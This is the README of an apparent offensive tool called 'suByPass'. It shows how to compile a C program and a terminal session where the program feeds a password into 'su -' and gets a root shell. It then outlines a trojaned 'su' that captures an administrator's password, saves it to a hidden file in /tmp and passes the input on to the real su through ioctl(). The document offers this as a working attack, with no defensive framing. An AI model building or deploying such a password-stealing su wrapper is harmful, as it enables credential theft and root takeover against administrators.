# suByPass
a solution to su: must be run from a terminal

### Compile code1.c:

using  
` cc code1.c -o code1 `

### run script:

```
$ (sleep 1; ./code_1 Passw0rD; ) & su -
[1] 3486
Password:
sh-3.1#     /* It worked */
```

### Why:

This technique can be used to catch password if someone owns a non-privileged user used by an administrator.

Let say a fake "su" command that:

    captures administrator password; 
    stores the password into a file (e.g. /tmp/.x); 
    calls the real "/bin/su" command and uses the ioctl() call.
